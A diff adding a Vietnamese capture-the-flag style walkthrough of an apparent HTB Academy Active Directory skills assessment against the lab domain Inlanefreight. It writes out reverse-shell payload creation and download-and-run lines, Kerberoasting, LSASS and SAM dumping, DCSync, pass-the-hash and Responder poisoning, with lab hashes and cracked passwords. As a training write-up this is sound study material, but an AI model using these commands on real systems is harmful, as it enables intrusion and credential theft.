@@ -1940,3 +1940,940 @@ c:\Users\Administrator\Desktop>type flag.txt
 burn1ng_d0wn_th3_f0rest!
 ```
 
+# AD Enumeration & Attacks - Skills Assessment Part I
+
+## Scenario
+
+A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
+
+Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
++ 1  Submit the contents of the flag.txt file on the administrator Desktop of the web server
+
+Truy cập vào `/uploads`, ta thấy có một webshell có sẵn được để lại ở đây như tình huống giả định.
+
+![](images/25.png)
+
+Giờ chúng ta cần nhận shell và tiến hành đi sâu hơn.
+`admin:My_W3bsH3ll_P@ssw0rd!`
+
+Chúng ta có được thông tin ban đầu của máy chủ này:
+
+```powershell
+Host Name:                 WEB-WIN01
+OS Name:                   Microsoft Windows Server 2019 Datacenter
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00430-10710-91142-AA408
+Original Install Date:     3/30/2022, 2:27:04 AM
+System Boot Time:          6/17/2025, 9:28:50 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,376 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,754 MB
+Virtual Memory: In Use:    677 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    INLANEFREIGHT.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB4578966
+                           [02]: KB4464455
+Network Card(s):           2 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.84.154
+                                 [02]: fe80::4dbc:f795:87b0:3efd
+                                 [03]: dead:beef::4dbc:f795:87b0:3efd
+                                 [04]: dead:beef::12a
+                           [02]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet1
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 172.16.6.100
+                                 [02]: fe80::e924:fe6a:e31e:808e
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+
+Vì webshell này khá bất tiện nên chúng ta sẽ đẩy nó sang một reverseshell.
+
+![](images/26.png)
+
+Thành công có được flag đầu tiên
+
+```powershell
+PS C:\windows\system32\inetsrv> cd C:\Users
+PS C:\Users> cd Administrator
+PS C:\Users\Administrator> cd Desktop
+PS C:\Users\Administrator\Desktop> type flag.txt
+JusT_g3tt1ng_st@rt3d!
+```
+
+Để có cái nhìn tổng quát hơn, tôi đã chạy SharpHound.exe
+
+```powershell
+PS C:\windows\system32\inetsrv> cd c:\users\public
+PS C:\users\public> cd download
+PS C:\users\public> curl -o sharphound.exe http://10.10.15.100:9981/SharpHound.exe
+PS C:\users\public> .\sharphound.exe -c all --zipfilename ILFREIGHT
+```
+
+Tiến hành chuyển file sang VM để phân tích:
+
+```zsh
+❯ mkdir share
+❯ sudo impacket-smbserver share -smb2support ./share -user test -password test
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.84.154,49821)
+[*] AUTHENTICATE_MESSAGE (\test,WEB-WIN01)
+[*] User WEB-WIN01\test authenticated successfully
+[*] test:::aaaaaaaaaaaaaaaa:8ed23b5a580f0f355a2e2b6293309e9e:0101000000000000008ee62c0fe0db01aa601e4ced5e1a4d000000000100100058007400780051004800720071006f000300100058007400780051004800720071006f00020010005200620067004500580059004e005800040010005200620067004500580059004e00580007000800008ee62c0fe0db0106000400020000000800300030000000000000000000000000400000cef05a7bbde45e81b48885d8b191a16322c6073e07852e668208530d3669e5b80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310030003000000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+[*] Disconnecting Share(1:IPC$)
+```
+
+Trên máy Windows:
+
+```powershell
+PS C:\users\public> dir
+
+
+    Directory: C:\users\public
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-r---       12/15/2020   2:29 AM                Documents                                                             
+d-r---        9/15/2018  12:12 AM                Downloads                                                             
+d-r---        9/15/2018  12:12 AM                Music                                                                 
+d-r---        9/15/2018  12:12 AM                Pictures                                                              
+d-r---        9/15/2018  12:12 AM                Videos                                                                
+-a----        6/17/2025  10:05 PM         238416 20250617220545_ILFREIGHT.zip                                          
+-a----        6/17/2025  10:04 PM        1307136 sharphound.exe                                                        
+-a----        6/17/2025  10:05 PM           1623 ZWYyMDIyNjctMDA3Zi00MmUxLThlYmMtZTM1ZmMzZTA3NzMy.bin                  
+
+
+PS C:\users\public> net use n: \\10.10.15.100\share /user:test test
+The command completed successfully.
+
+PS C:\users\public> move 20250617220545_ILFREIGHT.zip n:\
+
+```
+
+
+Như vậy DC của INLANEFREIGHT.LOCAL là DC01.INLANEFREIGHT.LOCAL
+![](images/29.png)
+```powershell
+Pinging DC01.INLANEFREIGHT.LOCAL [172.16.6.3] with 32 bytes of data:
+Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
+```
+
+Vậy trước hết ta có ip của máy foothold (WEB-WIN01): 172.16.6.100 từ systeminfo và ip của DC là 172.16.6.3
+
++ 1  Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
+
+Liệt kê các tài khoản dịch vụ (Kerberoastable) ta thấy SVC_SQL@INLANEFREIGHT.LOCAL có SPN giống như yêu cầu. Tiến hành Kerberoast tài khoản này.
+
+![](images/30.png)
+
+Tải sang Rubeus.exe:
+
+```powershell
+PS C:\users\public> copy n:\Rubeus.exe 
+```
+
+Kerberoasting:
+
+```powershell
+.\Rubeus.exe kerberoast /user:svc_sql /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : svc_sql
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_sql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_sql
+[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
+[*] PwdLastSet             : 3/30/2022 2:14:52 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$E48CBC99B8451E45D1037F754041C86A$16BEBF4FB22DF0CB7A1D00A0AE48A1DBDE1D86C28F5C1825973C8CF6822FB7CB3BB2DA4936B44BB70AA518D6C7CEFF1EED8CCD36F8A233150AF99B8B78C48BEF52F621231B06E447584C5B6B0B49F2922FAF9A4422B3035E2FD9AB1A107AA42BA69747EEF883FE8C3FB37D901F58362754E6DB6E59EE75610895A99137F8977CFE1198C64ED9CDBB5E0C1EFBF4EADD6664804EDDACE20C0834D327BF0A5781669AD6993E10D7DD757629FA42B660EBBBD8FF80934935FB37CACADF4C472FA2F4608C6C89069322C62A6EE39BA8B11BD6F86D8CEBD287CB29AAD8E8209D8663829FC43A351D2F7B680379D2E2C91E65CAEE3282072410DC6CCD601FBC5C69A1B1EE412FDC9FA2D7C3BE74F0F2AA1CBF791BA667DCA1803A458F442E62B4231C394E25AC8C76B23AB4C39D8102CD294DB01AC2E55C4EDBD44BADC64BB4BDC34953365D2DCACC9D49D3CDD399330D263A7660C177169CC39CE2D0A1840AAC3DC1CA6FE5899A6A2515129A56FA9E335AB3CC05DAD59142C0E1E267FAD7BFA952D7FC4B3D6F7D95E192E8AF9F9AEBD68B0E61C489770F4E8AD182A9994E878BC16728FF6A3224B3A7008F85C5FF2F300A8D961308DC1C5D3B5E0EA0D42802E1CBF287286B27511C7D09DF41DF4BD22A3A3DE50B87407A091ED905406D386363EA24763CF2F6453F2A988682EFDE6AA0F35FBB2787CD57A8B3B571EE90BEFA5429B935AB0C41087D52A57EE6DAC2F7C72DEF3D56B8AA4E989CA43290B7B88D8AD0BE69357D6383614AAA46B2EEB1B95510973A35A5026EF8767E9BF2B05E6B615D447B22CE8DE6C5FD3040FE022B09D4CCDCD3944AF44530C1D2DA85C4AF36B8F9FC9CF7CCA9059E3D65B6794789F513A4D98A0CEC07DF07F1CA2CB74E3DC00DE9335FCE4D3804958D05363E6E7D85EFFE846F464C585566C3D5AC659D60E42063039E23EB4A6DB59B40D663439E18D9CE312FDBDDAD849F25C4893F0D727492E5F305F7154F1C2DDC949E579E0EC87B31A82B8C235D45F3A851B95C07D330CACFC43DAB0DE5AA821FDC61281C5C80E58719A6A1FFCE3FA59A71C8B868F829200554D9518D105333EA7607069910BD995BCAD3D126F43745326869A43C0A1A29A688B6FD3A9DF046119E56D1C475130987704424D8A15167C05884AFAA0B87C1D48EC7D6C4EB0574DA3143678049CE92A1A11DA8CFE561666C7CE4AC0964B32BC2A6C7CDC6671A8784B1F164C8AA810EB6C384FFFF8980C09CABE7B7A1EBBEA986EA782CCD8DA3B47000AC4A64421E253C4A78D3DC7B675C8E3C921280FA60A33A3652D568DD0991F3153D30595701F8A87955FC6A6B50CDC3C424FFD19A82897FE221F1409CD795DC02EF2755FCB17172584A428B778E59DBB46967D038200148311B95EA4283CB97935F8196425A9669EC15B59F5593C47240A4A03A25B7F3275D58C8DDA4BC12EB1293B619140F83F4201B7DCDB7B6F72EBA8F21379C88E86CE89E902F91802F166A89C2D9E7752FE826006E37053103B842E0
+```
+
++ 1  Crack the account's password. Submit the cleartext value.
+
+Tiến hành bẻ khóa với hashcat, ta được mật khẩu là `lucky7`
+
+```zsh
+hashcat -m 13100 svc_sql_ilhash /usr/share/wordlists/rockyou.txt
+```
+
++ 1  Submit the contents of the flag.txt file on the Administrator desktop on MS01
+
+Xác nhận MS01:
+
+```powershell
+Pinging MS01.INLANEFREIGHT.LOCAL [172.16.6.50] with 32 bytes of data:
+Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+```
+
+Từ cred ta vừa có được: svc_sql:lucky7, tôi đã thử tạo phiên powershell remoting nhưng thất bại.
+
+```powershell
+PS C:\> $password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
+PS C:\> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
+PS C:\> Enter-PSSession -ComputerName MS01 -Credential $cred
+PS C:\> 
+PS C:\> hostname
+WEB-WIN01
+PS C:\> Enter-PSSession -ComputerName "MS01" -Credential $cred
+PS C:\> $user = "inlanefreight\svc_sql"
+$Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password
+PS C:\> PS C:\> Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
+PS C:\> Enter-PSSession -ComputerName 172.16.6.50 -Credential $credentials
+PS C:\> 
+```
+
+Do đó, chúng ta sẽ pivot và dùng winRM hoặc RDP.
+
+Trước hết tôi sẽ thử với `metasploit`.
+
+Tạo payload với msfvenom
+
+```zsh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.100 -f exe -o backupscript.exe LPORT=6666
+
+# Upload Server
+python3 -m http.server 9981
+```
+
+
+```zsh
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => tun0
+msf6 exploit(multi/handler) > set lport 6666
+lport => 6666
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.15.100:6666 
+[*] Sending stage (203846 bytes) to 10.129.202.242
+[*] Meterpreter session 1 opened (10.10.15.100:6666 -> 10.129.202.242:49697) at 2025-06-18 03:02:53 -0400
+
+meterpreter > sysinfo
+Computer        : WEB-WIN01
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : INLANEFREIGHT
+Logged On Users : 3
+Meterpreter     : x64/windows
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+Chạy payload
+```powershell
+wget http://10.10.15.100:9981/backupscript.exe
+.\backupscript.exe
+```
+
+Trước khi pivot, tôi sẽ thử PS remote với shell của evil-winRM trước:
+
+```zsh
+evil-winrm -i $ip -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+```
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Enter-PSSession -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred
+You are currently in a Windows PowerShell PSSession and cannot use the Enter-PSSession cmdlet to enter another PSSession.
+At line:1 char:1
++ Enter-PSSession -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $c ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Enter-PSSession], ArgumentException
+    + FullyQualifiedErrorId : RemoteHostDoesNotSupportPushRunspace,Microsoft.PowerShell.Commands.EnterPSSessionCommand
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $session = New-PSSession -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Enter-PSSession -Session $session 
+You are currently in a Windows PowerShell PSSession and cannot use the Enter-PSSession cmdlet to enter another PSSession.
+At line:1 char:1
++ Enter-PSSession -Session $session
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Enter-PSSession], ArgumentException
+    + FullyQualifiedErrorId : RemoteHostDoesNotSupportPushRunspace,Microsoft.PowerShell.Commands.EnterPSSessionCommand
+
+```
+
+Không khả thi, chúng ta phải có cách nào đó để có được shell của MS01.
+
+Một điều khá thú vị là khi tôi cố tình enable RDP cho WEB-WIN01, nó hoàn toàn có một phiên RDP được thiết lập và bạn sẽ thấy thông báo sau, kèm theo đó chúng ta sẽ bị đẩy ra ngoài...
+![](images/32.png)
+
+Giải pháp cuối cùng, có lẽ là pivot.
+
+Chisel không đem lại hạnh phúc cho tôi lúc này:
+
+![](images/33.png)
+
+Tôi sẽ pivot bằng msfconsole:
+
+```zsh
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+
+SRVPORT => 9050
+
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+
+SRVHOST => 0.0.0.0
+
+msf6 auxiliary(server/socks_proxy) > set version 4a
+
+version => 4a
+
+msf6 auxiliary(server/socks_proxy) > run
+```
+
+
+```zsh
+proxychains nmap -sT -p 3389,5985 172.16.6.50 -Pn -v
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 04:17 EDT
+Initiating Parallel DNS resolution of 1 host. at 04:17
+Completed Parallel DNS resolution of 1 host. at 04:17, 0.00s elapsed
+Initiating Connect Scan at 04:17
+Scanning 172.16.6.50 [2 ports]
+Completed Connect Scan at 04:17, 3.00s elapsed (2 total ports)
+Nmap scan report for 172.16.6.50
+Host is up.
+
+PORT     STATE    SERVICE
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
+```
+
+Ngoài ra ta vẫn cần autoroute cho 172.16.6.0.
+
+Kiểm tra rdp trên MS01:
+
+```zsh
+msf6 auxiliary(scanner/rdp/rdp_scanner) > run
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:1080 <--denied
+[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.6.50:3389  ...  OK
+[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.6.50:3389  ...  OK
+[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.6.50:3389  ...  OK
+[*] 172.16.6.50:3389      - Detected RDP on 172.16.6.50:3389      (name:MS01) (domain:INLANEFREIGHT) (domain_fqdn:INLANEFREIGHT.LOCAL) (server_fqdn:MS01.INLANEFREIGHT.LOCAL) (os_version:10.0.17763) (Requires NLA: Yes)
+[*] 172.16.6.50:3389      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Lấy phiên RDP cho MS01
+
+```zsh
+proxychains xfreerdp3 /v:172.16.6.50 /u:'INLANEFREIGHT\svc_sql' /p:lucky7 /drive:linux,/home/kali/Desktop/learning/AD_enum_attack/share
+```
+
+![](images/34.png)
+
+Lụm nhẹ cái flag
+
+![](images/35.png)
+
+
++ 1  Find cleartext credentials for another domain user. Submit the username as your answer.
+
+Qua truy vấn trên BH, MS01 có SESSION của một người dùng:
+
+![](images/36.png)
+
+Anh ta có khả năng thực hiện dcsync, điều này có ý nghĩa rất to lớn nếu như chúng ta có thể mạo danh người dùng tpetty@inlanefreight.local này.
+
+![](images/37.png)
+
+Điều khả thi nhất lúc này có lẽ là một pha dump lsass.
+
+```powershell
+PS C:\Windows\system32> Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1340      32     6916      18884       2.03    656   0 lsass
+
+
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 656 C:\lsass.dmp full
+```
+
+Chuyển nó sang ổ đĩa mà ta đã chia sẻ:
+
+![](images/38.png)
+
+Tiến hành dump
+
+```zsh
+pypykatz lsa minidump lsass.dmp > lsass_dump.txt
+INFO:pypykatz:Parsing file lsass.dmp
+```
+
++ 1  Submit this user's cleartext password.
+```zsh
+== LogonSession ==
+authentication_id 254813 (3e35d)
+session_id 1
+username tpetty
+domainname INLANEFREIGHT
+logon_server DC01
+logon_time 2025-06-18T06:59:00.241288+00:00
+sid S-1-5-21-2270287766-1317258649-2146029398-4607
+luid 254813
+	== MSV ==
+		Username: tpetty
+		Domain: INLANEFREIGHT
+		LM: NA
+		NT: fd37b6fec5704cadabb319cebf9e3a3a
+		SHA1: 38afea42a5e28220474839558f073979645a1192
+		DPAPI: da2ec07551ab1602b7468db08b41e3b200000000
+	== WDIGEST [3e35d]==
+		username tpetty
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: tpetty
+		Domain: INLANEFREIGHT.LOCAL
+	== WDIGEST [3e35d]==
+		username tpetty
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== DPAPI [3e35d]==
+		luid 254813
+		key_guid 8145d9b4-f8e8-4559-81f7-4a94a5de461c
+		masterkey 3c9875e8ec6400aef51dd28f6068a478be168bcabbeca51b98250d5ca3429ee7c5253cc2eeb76c3c890beb54c46a82eaf713cc5689a00b4ca1867298946c5a2f
+		sha1_masterkey ae124b2b2d7c55ac2d8c1cb9ffe533654d483fe9
+
+```
+
+Chúng ta không thể bẻ khóa hashNT với hashcat, vậy thử dump SAM thì sao.
+
+Thực ra nó không cần thiết phải lấy mật khẩu bản rõ, tuy nhiên theo yêu cầu chúng ta cứ dump SAM.
+
+Lấy về các file:
+
+```cmd
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+Tiến hành dump SAM
+
+```zsh
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+```
+
+Có một mật khẩu bản rõ ở đây, thậm chí chúng ta còn có cả hash của quản trị viên miền...
+
+![](images/39.png)
+
++ 1  What attack can this user perform?
+
+Như đã đề cập ở trên, người dùng này có thể thực hiện một cuộc tấn công dcsync
+
+![](images/37.png)
+
++ 1  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
+
+Dù sao ta cũng có hash của quản trị viên miền, tuy nhiên loại hash này cực kì khó nhằn để crack và hơn nữa nó không thể dùng để Path The Hash...
+
+Chúng ta đã có được ip của DC được đề cập ở trên là 172.16.6.3
+
+Dcsync From Linux:
+
+```zsh
+proxychains4 impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3
+```
+
+![](images/40.png)
+
+Dcsync From Windows
+
+Chạy cmd run as tpetty, chạy mimikatz.exe
+
+![](images/41.png)
+
+```cmd
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+
+Kết quả cần chú ý:
+```powershell
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6dbd63f4a0e7c8b221d61f265c4a08a7:::
+```
+
+Chúng ta tiến hành `jump` sang DC và có toàn quyền trên miền
+
+Trên Linux:
+```zsh
+proxychains4 impacket-psexec INLANEFREIGHT.LOCAL/Administrator@172.16.6.3 -hashes 'aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0'
+```
+
+![](images/42.png)
+Trên Windows
+
+Chạy cmd dưới quyền admin, chạy mimikatz và dùng path the hash
+
+```cmd
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:Administrator /ntlm:27dedb1dab4d8545c6e1c66fba077da0
+```
+
+![](images/43.png)
+
+Chúng ta có vô vàn cách, ngoài ra bạn có thể thử evil-winRM hoặc RDP...
+
+```zsh
+proxychains crackmapexec smb 172.16.6.3 -u Administrator -d INLANEFREIGHT.LOCAL -H 27dedb1dab4d8545c6e1c66fba077da0 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+![](images/44.png)
+
+```zsh
+proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
+```
+
+![](images/45.png)
+
+# AD Enumeration & Attacks - Skills Assessment Part II
+
+---
+
+## Scenario
+
+Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.
+
+Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s):  Target(s) are spawning...  
+
+ SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 1  Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
+
+Kiểm tra sơ bộ, chúng ta có dải mạng của domain này: 172.16.7.0/23
+
+```zsh
+ifconfig | grep inet
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet 10.129.83.144  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::5eaf:976d:86b0:54d  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::1ca4:e90c:ebce:5fb4  prefixlen 64  scopeid 0x20<link>
+        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
+        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+```
+
+```zsh
+fping -asgq 172.16.7.0/23
+172.16.7.3
+172.16.7.50
+172.16.7.60
+172.16.7.240
+
+     510 targets
+       4 alive
+     506 unreachable
+       0 unknown addresses
+
+    2024 timeouts (waiting for response)
+    2028 ICMP Echos sent
+       4 ICMP Echo Replies received
+    2024 other ICMP received
+
+ 0.043 ms (min round trip time)
+ 0.879 ms (avg round trip time)
+ 1.49 ms (max round trip time)
+       15.304 sec (elapsed real time)
+```
+
+Cái này thực sự rất cuốn hút, chúng ta không có foothold nào và từ câu hỏi, tôi biết rằng mình phải làm là Network Poisoning
+
+```zsh
+sudo responder -I ens224
+```
+
+Nếu bạn gặp phải tình huống nó đã ghi hash này vào log trước đó, hãy xóa log của nó và bắt đầu lại. Hoặc đọc nó
+
+```zsh
+┌─[htb-student@skills-par01]─[/usr/share/responder/logs]
+└──╼ $cat SMB-NTLMv2-SSP-172.16.7.3.txt 
+AB920::INLANEFREIGHT:3991e2afefb8a67b:F4E4103BBFB254F05EF4C13959F89DB9:0101000000000000009B1A9F2EE0DB01EE82EF79A48E91DD0000000002000800300055005300560001001E00570049004E002D0057004700310035005500440036004D0042005800530004003400570049004E002D0057004700310035005500440036004D004200580053002E0030005500530056002E004C004F00430041004C000300140030005500530056002E004C004F00430041004C000500140030005500530056002E004C004F00430041004C0007000800009B1A9F2EE0DB0106000400020000000800300030000000000000000000000000200000736805C0A227AE2BE04B1EE1FD7B68E448FAA23684ECC51ADE5F671250EF5D8D0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+```
+
++ 1  What is this user's cleartext password?
+
+```zsh
+hashcat -m 5600 AB920_NTLM /usr/share/wordlists/rockyou.txt
+```
+
+![](../46.png)
+
+AB920:weasal
+
++ 1  Submit the contents of the C:\flag.txt file on MS01.
+
+Hiện giờ chúng ta chỉ có thể xác định được DC01
+
+`172.16.7.3 inlanefreight.local dc01`
+
+Nhanh chóng xác định các host còn lại:
+
+```zsh
+crackmapexec smb 172.16.7.50
+SMB         172.16.7.50     445    MS01  
+```
+
+```zsh
+crackmapexec smb 172.16.7.60
+SMB         172.16.7.60     445    SQL01 
+```
+
+```zsh
+172.16.7.3 DC01
+172.16.7.50 MS01
+172.16.7.60 SQL01
+172.16.7.240 we are here
+```
+
